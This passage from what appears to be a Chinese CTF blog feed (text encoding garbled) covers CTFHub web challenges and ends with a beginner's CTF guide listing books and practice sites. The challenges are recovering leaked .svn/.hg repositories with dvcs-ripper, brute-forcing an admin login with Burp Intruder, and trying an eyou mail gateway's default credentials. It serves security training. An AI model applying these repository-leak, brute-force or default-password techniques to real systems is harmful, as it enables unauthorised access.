.svn/</span><br>.svn/<br>â”œâ”€â”€ entries<br>â”œâ”€â”€ format<br>â”œâ”€â”€ pristine<br>â”‚Â Â  â”œâ”€â”€ 96<br>â”‚Â Â  â”‚Â Â  â””â”€â”€ 9615f4dee905fe62f578d91e3df23c7e3d294e15.svn-base<br>â”‚Â Â  â””â”€â”€ bf<br>â”‚Â Â      â””â”€â”€ bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base<br>â”œâ”€â”€ text-base<br>â”œâ”€â”€ tmp<br>â”œâ”€â”€ wc.db<br>â””â”€â”€ wc.db-journal<br><br>5 directories, 6 files<br></code></pre></td></tr></table></figure><p>çŒœæµ‹ <code>.svn/pristine</code> é‡Œé¢å­˜çš„æ˜¯ä¸åŒç‰ˆæœ¬ï¼Œ<code>cat</code> æŸ¥çœ‹ï¼Œåœ¨ <code>pristine/96/9615f4dee905fe62f578d91e3df23c7e3d294e15.svn-base</code> ä¸­å‘ç° flag ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">372</span>c<span class="hljs-number">3</span>bfe<span class="hljs-number">29808</span>e<span class="hljs-number">2</span>a<span class="hljs-number">6</span>db<span class="hljs-number">76</span>c<span class="hljs-number">00</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="6ã€HGæ³„éœ²"><a href="#6ã€HGæ³„éœ²" class="headerlink" title="6ã€HGæ³„éœ²"></a>6ã€HGæ³„éœ²</h2><p>é¢˜ç›®æ˜¾ç¤ºï¼šFlag åœ¨æœåŠ¡ç«¯æ—§ç‰ˆæœ¬çš„æºä»£ç ä¸­, ä¸å¤ªå¥½ä½¿çš„æƒ…å†µä¸‹, è¯•ç€æ‰‹å·¥è§£å†³ã€‚</p><p>ä½¿ç”¨ <code>dirsearch</code> è¿›è¡Œæ‰«æï¼Œå‘ç°å¯èƒ½æ˜¯ <code>HGæ³„éœ²</code> ï¼Œä½¿ç”¨ <code>dvcs-ripper</code> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-hg.pl -v -u http://challenge-fee1df107e428836.sandbox.ctfhub.com:10800/.hg/</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å·¥å…·çš„æ‰€åœ¨ç›®å½•ä¸‹ç”Ÿæˆäº† <code>.hg</code> æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ç”±äºéšè—éœ€è¦è¾“å…¥ <code>ls -al</code> å‘½ä»¤æ‰èƒ½çœ‹åˆ° ã€‚</p><p>ä½¿ç”¨ <code>tree</code> å‘½ä»¤æŸ¥çœ‹ <code>.hg</code> å†…çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> tree .hg/</span><br>.hg/<br>â”œâ”€â”€ 00changelog.i<br>â”œâ”€â”€ dirstate<br>â”œâ”€â”€ last-message.txt<br>â”œâ”€â”€ requires<br>â”œâ”€â”€ store<br>â”‚Â Â  â”œâ”€â”€ 00changelog.i<br>â”‚Â Â  â”œâ”€â”€ 00manifest.i<br>â”‚Â Â  â”œâ”€â”€ data<br>â”‚Â Â  â”‚Â Â  â”œâ”€â”€ 50x.html.i<br>â”‚Â Â  â”‚Â Â  â””â”€â”€ index.html.i<br>â”‚Â Â  â”œâ”€â”€ fncache<br>â”‚Â Â  â””â”€â”€ undo<br>â”œâ”€â”€ undo.branch<br>â”œâ”€â”€ undo.desc<br>â”œâ”€â”€ undo.dirstate<br>â””â”€â”€ wcache<br>    â”œâ”€â”€ checkisexec<br>    â””â”€â”€ checknoexec<br><br>3 directories, 15 files<br></code></pre></td></tr></table></figure><p><code>cat</code> æŸ¥çœ‹ <code>.hg/store/fncache</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cat .hg/store/fncache</span> <br>data/index.html.i<br>data/50x.html.i<br>data/flag_2225111905.txt.i<br></code></pre></td></tr></table></figure><p>å‘ç° <code>.hg/store/data</code> ä¸­åº”è¯¥æœ‰ <code>flag_2225111905.txt</code> ï¼Œä½†å®é™…ä¸Šå´æ²¡æœ‰ï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½æ²¡æœ‰æŠ“å–åˆ°ï¼ŒæŸ¥çœ‹æŠ“å–è¿‡ç¨‹å¾—åˆ°éªŒè¯ ã€‚</p><p>ç›´æ¥ URL è®¿é—® <code>flag_2225111905.txt</code> æ–‡ä»¶ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://challenge-fee1df107e428836.sandbox.ctfhub.com:10800/flag_2225111905.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">79</span>b<span class="hljs-number">4</span>fe<span class="hljs-number">2881022888</span>ff<span class="hljs-number">2679</span>c<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Leakage</tag>
      
      <tag>Wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-å¯†ç å£ä»¤</title>
    <link href="/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/"/>
    <url>/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>å¼±å£ä»¤ (weak password) æ²¡æœ‰ä¸¥æ ¼å’Œå‡†ç¡®çš„å®šä¹‰ï¼Œé€šå¸¸è®¤ä¸ºå®¹æ˜“è¢«åˆ«äººï¼ˆä»–ä»¬æœ‰å¯èƒ½å¯¹ä½ å¾ˆäº†è§£ï¼‰çŒœæµ‹åˆ°æˆ–è¢«ç ´è§£å·¥å…·ç ´è§£çš„å£ä»¤å‡ä¸ºå¼±å£ä»¤ã€‚</p><p>å¼±å£ä»¤æŒ‡çš„æ˜¯ä»…åŒ…å«ç®€å•æ•°å­—å’Œå­—æ¯çš„å£ä»¤ï¼Œä¾‹å¦‚â€œ123â€ã€â€œabcâ€ç­‰ï¼Œå› ä¸ºè¿™æ ·çš„å£ä»¤å¾ˆå®¹æ˜“è¢«åˆ«äººç ´è§£ï¼Œä»è€Œä½¿ç”¨æˆ·çš„è®¡ç®—æœºé¢ä¸´é£é™©ï¼Œå› æ­¤ä¸æ¨èç”¨æˆ·ä½¿ç”¨ã€‚</p><h2 id="1ã€å¼±å£ä»¤"><a href="#1ã€å¼±å£ä»¤" class="headerlink" title="1ã€å¼±å£ä»¤"></a>1ã€å¼±å£ä»¤</h2><p>è¿›å…¥é¢˜ç›®é¡µé¢ï¼Œå‘ç°ç™»å½•é¡µé¢ï¼Œå…ˆä»»æ„è¾“å…¥ <code>admin/admin</code> è¿›è¡Œç™»å½•å°è¯•ï¼Œå‘ç°ä¸å¯¹ã€‚æš‚æ—¶æ²¡æœ‰å…¶ä»–çº¿ç´¢ï¼Œå‡è®¾ç”¨æˆ·åå°±æ˜¯ <code>admin</code>ï¼Œç„¶åè¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p><p>å†æ¬¡è¾“å…¥ <code>admin/admin</code> è¿›è¡Œç™»å½•å°è¯•ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œå¾—åˆ°å­—ç¬¦ä¸² <code>name=admin&amp;password=admin&amp;referer=</code> ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼š</p><p>1ï¼‰å°†æŠ¥æ–‡å‘é€åˆ° <code>Intruder</code>ï¼Œç‚¹å‡» <code>Positions</code>ï¼Œå°† <code>password=</code> åé¢çš„ <code>admin</code> æ·»åŠ ä¸º <code>Payload Positions</code> ã€‚</p><p>2ï¼‰åœ¨ <code>Payloads</code> é€‰é¡¹å¡ä¸‹ï¼Œé€‰æ‹© <code>Payload Type</code> ä¸º <code>Simple List</code>ï¼Œç„¶ååœ¨ <code>Payload Options</code> ä¸­ç‚¹å‡» <code>Load</code> åŠ è½½å¯†ç å­—å…¸ã€‚</p><p>3ï¼‰ç‚¹å‡» <code>Start Attack</code> ï¼Œå¼€å§‹çˆ†ç ´ï¼Œå®ŒæˆåæŒ‰ <strong>Length</strong> æ’åºï¼Œå‘ç°ä¸€ä¸ªé•¿åº¦ä¸ä¸€æ ·çš„ ã€‚</p><p>4ï¼‰ç‚¹å‡»æŸ¥çœ‹ï¼Œç‚¹å‡» <code>Response</code>ï¼Œå¾—åˆ° <code>flag</code> ã€‚</p><h2 id="2ã€é»˜è®¤å£ä»¤"><a href="#2ã€é»˜è®¤å£ä»¤" class="headerlink" title="2ã€é»˜è®¤å£ä»¤"></a>2ã€é»˜è®¤å£ä»¤</h2><p>ç«™ç‚¹ä¸º eyou é‚®ä»¶ç½‘å…³ï¼Œæ ¹æ®æç¤ºï¼Œåœ¨ç™¾åº¦ä¸­æœç´¢å…¶é»˜è®¤ç”¨æˆ·åå’Œå¯†ç  ã€‚</p><div class="table-container"><table><thead><tr><th>äº¿é‚®é‚®ä»¶ç½‘å…³</th><th>eyouuser</th><th>eyou_admin</th></tr></thead><tbody><tr><td></td><td>eyougw</td><td>admin@(eyou)</td></tr><tr><td></td><td>admin</td><td>Â±ccccc</td></tr><tr><td></td><td>admin</td><td>cyouadmin</td></tr></tbody></table></div><p>é€ä¸€å°è¯•åå¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·å/å¯†ç ï¼š <code>eyougw/admin@(eyou)</code> ã€‚</p><p>è®¿é—®æˆåŠŸåè·å¾— flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;c<span class="hljs-number">3</span>befbe<span class="hljs-number">8</span>d<span class="hljs-number">1</span>c<span class="hljs-number">39</span>fd<span class="hljs-number">66</span>fe<span class="hljs-number">4</span>e<span class="hljs-number">037</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Wp</tag>
      
      <tag>password</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF</title>
    <link href="/2021/08/04/CTF/CTF/"/>
    <url>/2021/08/04/CTF/CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFå…¥é—¨"><a href="#CTFå…¥é—¨" class="headerlink" title="CTFå…¥é—¨"></a>CTFå…¥é—¨</h1><h2 id="å…¥é—¨éœ€è¦å“ªäº›åŸºç¡€ï¼š"><a href="#å…¥é—¨éœ€è¦å“ªäº›åŸºç¡€ï¼š" class="headerlink" title="å…¥é—¨éœ€è¦å“ªäº›åŸºç¡€ï¼š"></a>å…¥é—¨éœ€è¦å“ªäº›åŸºç¡€ï¼š</h2><p>1ã€ç¼–ç¨‹è¯­è¨€åŸºç¡€ï¼ˆCã€æ±‡ç¼–ã€è„šæœ¬è¯­è¨€ï¼‰<br>2ã€æ•°å­¦åŸºç¡€ï¼ˆç®—æ³•ã€å¯†ç å­¦ï¼‰<br>3ã€è„‘æ´å¤§å¼€ï¼ˆå¤©é©¬è¡Œç©ºçš„æƒ³è±¡ã€æ¨ç†è§£å¯†ï¼‰<br>4ã€ä½“åŠ›è€åŠ›ï¼ˆé€šå®µç†¬å¤œï¼‰</p><h2 id="å¦‚ä½•å…¥é—¨å­¦"><a href="#å¦‚ä½•å…¥é—¨å­¦" class="headerlink" title="å¦‚ä½•å…¥é—¨å­¦"></a>å¦‚ä½•å…¥é—¨å­¦</h2><p>1ã€æ¶è¡¥åŸºç¡€çŸ¥è¯†<br>2ã€å°è¯•ä»è„‘æ´å¼€å§‹ å¦‚é»‘å®¢game<br>4ã€å­¦ä¿¡æ¯å®‰å…¨ä¸“ä¸šçŸ¥è¯†<br>5ã€é”»ç‚¼ä½“åŠ›è€åŠ› å‘¨å…­æ—¥éƒ½æœ‰æ¯”èµ›</p><h2 id="åˆ°åº•å¦‚ä½•å­¦"><a href="#åˆ°åº•å¦‚ä½•å­¦" class="headerlink" title="åˆ°åº•å¦‚ä½•å­¦"></a>åˆ°åº•å¦‚ä½•å­¦</h2><p>1ã€åˆ†æèµ›é¢˜æƒ…å†µ<br>2ã€åˆ†æè‡ªèº«èƒ½åŠ› è‡ªå·±æœ€é€‚åˆå“ªä¸ªæ–¹å‘<br>3ã€é€‰æ‹©æ›´é€‚åˆçš„å…¥æ‰‹</p><h2 id="åˆ†æèµ›é¢˜"><a href="#åˆ†æèµ›é¢˜" class="headerlink" title="åˆ†æèµ›é¢˜"></a>åˆ†æèµ›é¢˜</h2><p>PWNã€Reverse åé‡å¯¹æ±‡ç¼–ã€é€†å‘çš„ç†è§£ å¯¹åº•å±‚ç†è§£<br>Crypto åé‡å¯¹æ•°å­¦ã€ç®—æ³•çš„æ·±å…¥å­¦ä¹  å¯†ç è¯¾è¦æ·±å…¥å­¦<br>Web åé‡å¯¹æŠ€å·§æ²‰æ·€ã€å¿«é€Ÿæœç´¢èƒ½åŠ›çš„æŒ‘æˆ˜ å‘æ•£æ€ç»´ï¼Œå¯¹åº•å±‚åªéœ€è¦äº†è§£ï¼Œä»£ç åŸç†ï¼Œå…³äºæ¼æ´ç‚¹çš„ç§¯ç´¯<br>Misc åˆ™æ›´å¤æ‚ï¼Œæ‰€æœ‰ä¸è®¡ç®—æœºå®‰å…¨æŒ‘æˆ˜æœ‰å…³çš„éƒ½åœ¨å…¶ä¸­ éšå†™ï¼Œå›¾ç‰‡æ•°æ®åˆ†æè¿˜åŸï¼Œæµé‡ï¼Œå¤§æ•°æ®ï¼Œå¯¹æ¸¸æˆåˆ†æé€†å‘</p><h2 id="å¸¸è§„åšæ³•ï¼š"><a href="#å¸¸è§„åšæ³•ï¼š" class="headerlink" title="å¸¸è§„åšæ³•ï¼š"></a>å¸¸è§„åšæ³•ï¼š</h2><p>Aæ–¹å‘ï¼šPWN+Reverse+Cryptoéšæœºæ­é…<br>Bæ–¹å‘ï¼šWeb+Miscç»„åˆ<br>Miscæ‰€æœ‰äººéƒ½å¯ä»¥åš</p><h2 id="å…¥é—¨çŸ¥è¯†ï¼š"><a href="#å…¥é—¨çŸ¥è¯†ï¼š" class="headerlink" title="å…¥é—¨çŸ¥è¯†ï¼š"></a>å…¥é—¨çŸ¥è¯†ï¼š</h2><p>éƒ½è¦å­¦çš„å†…å®¹ï¼šlinuxåŸºç¡€ã€è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€ç½‘ç»œåè®®åˆ†æ</p><p>Aæ–¹å‘ï¼šIDAå·¥å…·ä½¿ç”¨ï¼ˆfsæ’ä»¶ï¼‰ã€é€†å‘å·¥ç¨‹ã€å¯†ç å­¦ã€ç¼“å†²åŒºæº¢å‡ºç­‰<br>Bæ–¹å‘ï¼šWebå®‰å…¨ã€ç½‘ç»œå®‰å…¨ã€å†…ç½‘æ¸—é€ã€æ•°æ®åº“å®‰å…¨ç­‰ å‰10çš„å®‰å…¨æ¼æ´</p><h2 id="æ¨èä¹¦ï¼š"><a href="#æ¨èä¹¦ï¼š" class="headerlink" title="æ¨èä¹¦ï¼š"></a>æ¨èä¹¦ï¼š</h2><p>Aæ–¹å‘ï¼š</p><p>RE for Beginners<br>IDA Proæƒå¨æŒ‡å—<br>æ­ç§˜å®¶åº­è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯<br>è‡ªå·±å®šæ“ä½œç³»ç»Ÿ<br>é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ï¼šç³»ç»Ÿå®æˆ˜ç¯‡</p><p>Bæ–¹å‘ï¼š</p><p>Webåº”ç”¨å®‰å…¨æƒå¨æŒ‡å— æœ€æ¨èå°ç™½ï¼Œå®è§‚webå®‰å…¨<br>Webå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜<br>é»‘å®¢ç§˜ç±â€”â€”æ¸—é€æµ‹è¯•å®ç”¨æŒ‡å—<br>é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ webå®æˆ˜ç¯‡<br>ä»£ç å®¡è®¡ï¼šä¼ä¸šçº§webä»£ç å®‰å…¨æ¶æ„</p><h2 id="å…¥é—¨â€”â€”ä»åŸºç¡€é¢˜ç›®å‡ºå‘ï¼ˆæ¨èèµ„æºï¼‰"><a href="#å…¥é—¨â€”â€”ä»åŸºç¡€é¢˜ç›®å‡ºå‘ï¼ˆæ¨èèµ„æºï¼‰" class="headerlink" title="å…¥é—¨â€”â€”ä»åŸºç¡€é¢˜ç›®å‡ºå‘ï¼ˆæ¨èèµ„æºï¼‰"></a>å…¥é—¨â€”â€”ä»åŸºç¡€é¢˜ç›®å‡ºå‘ï¼ˆæ¨èèµ„æºï¼‰</h2><p><a href="http://ctf.idf.cn">http://ctf.idf.cn</a> !!!é¦–æ¨ idfå®éªŒå®¤ï¼šé¢˜ç›®éå¸¸åŸºç¡€ï¼Œåª1ä¸ªç‚¹<br>www.ichunqiu.com æœ‰çº¿ä¸‹å†³èµ›é¢˜ç›®å¤ç°<br><a href="http://oj.xctf.org.cn/xctf">http://oj.xctf.org.cn/xctf</a> é¢˜åº“ç½‘ç«™ï¼Œå†å¹´é¢˜ï¼Œç»ƒä¹ åœºï¼Œæ¯”è¾ƒéš¾<br>www.wechall.net/challs !!!!!!éå¸¸å…¥é—¨çš„å›½å¤–ctfé¢˜åº“ï¼Œå¾ˆå¤šå›½å†…éƒ½æ˜¯ä»è¿™é‡Œåˆ·é¢˜æˆé•¿èµ·æ¥çš„<br><a href="http://canyouhack.it/">http://canyouhack.it/</a> å›½å¤–ï¼Œå…¥é—¨ï¼Œæœ‰ç§»åŠ¨å®‰å…¨<br><a href="https://microcorruption.com/login">https://microcorruption.com/login</a> Aæ–¹å‘ å¯†ç ï¼Œé€†å‘é…·ç‚«æ¸¸æˆä»£<br>httpï¼š//smashthestack.org Aæ–¹å‘ï¼Œç®€æ´ï¼Œå›½å¤–ï¼Œwargamesï¼Œè¿‡å…³<br><a href="http://overthewire.ofg/wargames/">http://overthewire.ofg/wargames/</a> ï¼ï¼ï¼ï¼æ¨èAæ–¹å‘ å›½å†…èµ„æ–™å¤šï¼Œè€ç‰Œwargame<br>httpsï¼š//exploit-exercises.com Aæ–¹å‘ è€ç‰Œwargameï¼Œå›½å†…èµ„æ–™å¤š<br><a href="http://pawnable.kr/play.php">http://pawnable.kr/play.php</a> pwnç±»æ¸¸ä¹åœºï¼Œä¸åˆ°100é¢˜<br><a href="http://ctf.moonsoscom/pentest/index.php">http://ctf.moonsoscom/pentest/index.php</a> Bæ–¹å‘ ç±³å®‰çš„Webæ¼æ´é¶åœºï¼ŒåŸºç¡€ï¼Œæ ¸å¿ƒçŸ¥è¯†ç‚¹<br>httpï¼š//prompt.ml/0 Bæ–¹å‘ å›½å¤–çš„xssæµ‹è¯•<br><a href="http://redtiger.labs.overthewire.org/">http://redtiger.labs.overthewire.org/</a> Bæ–¹å‘ å›½å¤–sqlæ³¨å…¥æŒ‘æˆ˜ç½‘ç«™ï¼Œ10å…³ï¼Œè¿‡å…³çš„å½¢å¼ ä¸åŒçš„æ³¨å…¥ï¼Œå¾ªåºæ¸è¿‘åœ°ç»ƒä¹ </p><h2 id="å·¥å…·ï¼š"><a href="#å·¥å…·ï¼š" class="headerlink" title="å·¥å…·ï¼š"></a>å·¥å…·ï¼š</h2><p><a href="https://github.com/truongkma/ctf-tools">https://github.com/truongkma/ctf-tools</a><br><a href="https://github.com/Plkachu/v0lt">https://github.com/Plkachu/v0lt</a><br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br><a href="https://github.com/TUCTF/Tools">https://github.com/TUCTF/Tools</a></p><h2 id="å…¥é—¨â€”ä»¥ç»ƒä¿ƒèµ›ï¼Œä»¥èµ›å…»ç»ƒ"><a href="#å…¥é—¨â€”ä»¥ç»ƒä¿ƒèµ›ï¼Œä»¥èµ›å…»ç»ƒ" class="headerlink" title="å…¥é—¨â€”ä»¥ç»ƒä¿ƒèµ›ï¼Œä»¥èµ›å…»ç»ƒ"></a>å…¥é—¨â€”ä»¥ç»ƒä¿ƒèµ›ï¼Œä»¥èµ›å…»ç»ƒ</h2><p>é€‰æ‹©ä¸€åœºå·²ç»å­˜åœ¨writeupçš„æ¯”èµ›</p><p>æ€»ç»“è§£é¢˜è¿‡ç¨‹ï¼Œåˆ†æå‡ºé¢˜äººæƒ³æ³•</p><p>å‚åŠ ä¸€åœºæœ€æ–°çš„ctfæ¯”èµ›<br>httpsï¼š//ctftime.org/ å›½é™…æ¯”èµ›ï¼Œæœ‰å¾ˆå¤šåŸºç¡€çš„<br>httpï¼š//www.xctf.org.cn/ å›½å†…æ¯”èµ›ï¼Œæ¯”è¾ƒéš¾</p><h2 id="ç»„å»ºå›¢é˜Ÿâ€”-å¼ºåŠ›æˆå‘˜ç”»åƒ"><a href="#ç»„å»ºå›¢é˜Ÿâ€”-å¼ºåŠ›æˆå‘˜ç”»åƒ" class="headerlink" title="ç»„å»ºå›¢é˜Ÿâ€”-å¼ºåŠ›æˆå‘˜ç”»åƒ"></a>ç»„å»ºå›¢é˜Ÿâ€”-å¼ºåŠ›æˆå‘˜ç”»åƒ</h2><p>1.æ€ç»´è·³è·ƒï¼šçµæ´»æ€§ï¼Œä¸ä¼šé’»å¢™è„š<br>2.ä¸“æ³¨ï¼šé‡åˆ°é—®é¢˜ä¸æ”¾å¼ƒç›´åˆ°è§£å†³<br>3.è€åŠ›ï¼šè¿ç»­ä¸€å¤©ç ”ç©¶æŠ€æœ¯<br>4.å›¢é˜Ÿç²¾ç¥ï¼šè´£ä»»ã€å‡èšã€åˆ†äº«</p><p>æœ‰3æ¡ä¸ºå¼ºåŠ›æˆå‘˜ï¼Œæœ‰4æ¡ä¼šæˆä¸ºå¼ºåŠ›é˜Ÿé•¿ï¼</p><p>æ€»ç»“è‡ªiæ˜¥ç§‹CTFå…¥é—¨æŒ‡å—</p><h1 id="CTFå­¦ä¹ ç«™ç‚¹æ€»ç»“"><a href="#CTFå­¦ä¹ ç«™ç‚¹æ€»ç»“" class="headerlink" title="CTFå­¦ä¹ ç«™ç‚¹æ€»ç»“"></a>CTFå­¦ä¹ ç«™ç‚¹æ€»ç»“</h1><h2 id="0x01-CTF-èµ„è®¯"><a href="#0x01-CTF-èµ„è®¯" class="headerlink" title="0x01 CTF èµ„è®¯"></a>0x01 CTF èµ„è®¯</h2><p>XCTFè”èµ›ï¼š<a href="https://www.xctf.org.cn/">https://www.xctf.org.cn/</a></p><p>360å®‰å…¨å®¢ï¼š<a href="http://bobao.360.cn/">http://bobao.360.cn/</a></p><p>CTF-TIMEï¼š<a href="https://ctftime.org/event/list/upcoming">https://ctftime.org/event/list/upcoming</a></p><p>CTF Rankï¼š<a href="http://ctfrank.org/">http://ctfrank.org/</a></p><h2 id="0x02-CTFç»ƒä¹ "><a href="#0x02-CTFç»ƒä¹ " class="headerlink" title="0x02 CTFç»ƒä¹ "></a>0x02 CTFç»ƒä¹ </h2><h3 id="BIN"><a href="#BIN" class="headerlink" title="BIN:"></a>BIN:</h3><p>reversing</p><p><a href="https://link.zhihu.com/?target=http%3A//reversing.kr/">http://reversing.kr/</a></p><p>pwnable</p><p><a href="https://link.zhihu.com/?target=http%3A//pwnable.kr/">http://pwnable.kr/</a></p><p>pwnable(TAIWAN)</p><p><a href="https://link.zhihu.com/?target=http%3A//pwnable.tw/">http://pwnable.tw/</a></p><p>exploit-exercises</p><p><a href="https://link.zhihu.com/?target=https%3A//exploit-exercises.com/">https://exploit-exercises.com/</a></p><p>overthewire</p><p><a href="https://link.zhihu.com/?target=http%3A//overthewire.org/wargames/">http://overthewire.org/wargames/</a></p><p>netgarage</p><p><a href="https://link.zhihu.com/?target=https%3A//io.netgarage.org/">https://io.netgarage.org/</a></p><p>binå¹²è´§</p><p><a href="https://link.zhihu.com/?target=http%3A//security.cs.rpi.edu/courses/binexp-spring2015/">http://security.cs.rpi.edu/courses/binexp-spring2015/</a></p><h3 id="SQLï¼š"><a href="#SQLï¼š" class="headerlink" title="SQLï¼š"></a>SQLï¼š</h3><p>sqli-labs</p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>RedTigers Hackit</p><p><a href="https://link.zhihu.com/?target=http%3A//redtiger.labs.overthewire.org/">http://redtiger.labs.overthewire.org/</a></p><h3 id="XSSï¼š"><a href="#XSSï¼š" class="headerlink" title="XSSï¼š"></a>XSSï¼š</h3><p>prompt</p><p><a href="https://link.zhihu.com/?target=http%3A//prompt.ml/0">http://prompt.ml/0</a></p><p>XSS Challenges</p><p><a href="https://link.zhihu.com/?target=http%3A//xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p><p>escape</p><p><a href="https://link.zhihu.com/?target=https%3A//alf.nu/alert1">https://alf.nu/alert1</a></p><p>xss-game</p><p><a href="https://link.zhihu.com/?target=https%3A//xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h3 id="OJå¹³å°ä»¥åŠCTFèµ›äº‹å¤ç›˜ï¼š"><a href="#OJå¹³å°ä»¥åŠCTFèµ›äº‹å¤ç›˜ï¼š" class="headerlink" title="OJå¹³å°ä»¥åŠCTFèµ›äº‹å¤ç›˜ï¼š"></a>OJå¹³å°ä»¥åŠCTFèµ›äº‹å¤ç›˜ï¼š</h3><p>XCTF-OJ</p><p><a href="https://link.zhihu.com/?target=http%3A//oj.xctf.org.cn/">http://oj.xctf.org.cn/</a></p><p>Pwnhub</p><p><a href="https://link.zhihu.com/?target=http%3A//pwnhub.cn/">http://pwnhub.cn/</a></p><p>Jarvisoj</p><p><a href="https://link.zhihu.com/?target=https%3A//www.jarvisoj.com/">https://www.jarvisoj.com/</a></p><h3 id="å›½å†…ç»¼åˆç»ƒä¹ -å›½äº§çš„-ï¼š"><a href="#å›½å†…ç»¼åˆç»ƒä¹ -å›½äº§çš„-ï¼š" class="headerlink" title="å›½å†…ç»¼åˆç»ƒä¹ (å›½äº§çš„)ï¼š"></a>å›½å†…ç»¼åˆç»ƒä¹ (å›½äº§çš„)ï¼š</h3><p>ç½‘ç»œä¿¡æ¯æ”»é˜²å­¦ä¹ å¹³å°</p><p><a href="https://link.zhihu.com/?target=http%3A//hackinglab.cn/">http://hackinglab.cn/</a></p><p>è¥¿æ™®å®éªŒå§</p><p><a href="https://link.zhihu.com/?target=http%3A//www.shiyanbar.com/ctf/practice">http://www.shiyanbar.com/ctf/practice</a></p><p>Iæ˜¥ç§‹CTFæŒ‘æˆ˜</p><p><a href="https://link.zhihu.com/?target=http%3A//www.ichunqiu.com/racing">http://www.ichunqiu.com/racing</a></p><p>åˆå¤©CTF</p><p><a href="https://link.zhihu.com/?target=http%3A//www.hetianlab.com/CTFrace.html">http://www.hetianlab.com/CTFrace.html</a></p><p>å—äº¬é‚®ç”µå¤§å­¦</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.nuptsast.com/">http://ctf.nuptsast.com/</a></p><p>SniperOJ</p><p><a href="https://link.zhihu.com/?target=http%3A//www.sniperoj.cn/">http://www.sniperoj.cn/</a></p><p>bugku</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.bugku.com/">http://ctf.bugku.com/</a></p><p>CTFé¢˜ç›®</p><p><a href="https://link.zhihu.com/?target=http%3A//captf.com/">http://captf.com/</a></p><p>å…‰æ£èŠ‚ç¨‹åºå‘˜é—¯å…³ç§€</p><p><a href="https://link.zhihu.com/?target=https%3A//1111.segmentfault.com/">https://1111.segmentfault.com/</a></p><p>ISA Test</p><p><a href="https://link.zhihu.com/?target=https%3A//www.helloisa.com/test/">https://www.helloisa.com/test/</a></p><p>é»‘å®¢ä¸›æ—ä¹‹æ—…</p><p><a href="https://link.zhihu.com/?target=http%3A//www.fj543.com/hack/">http://www.fj543.com/hack/</a></p><p>Jlu.CTF</p><p><a href="https://link.zhihu.com/?target=http%3A//ctf.spirit.org.cn/">http://ctf.spirit.org.cn/</a></p><p>çº¢å®¢é—¯å…³æ¸¸æˆ</p><p><a href="https://link.zhihu.com/?target=http%3A//hkyx.myhack58.com/">http://hkyx.myhack58.com/</a></p><h3 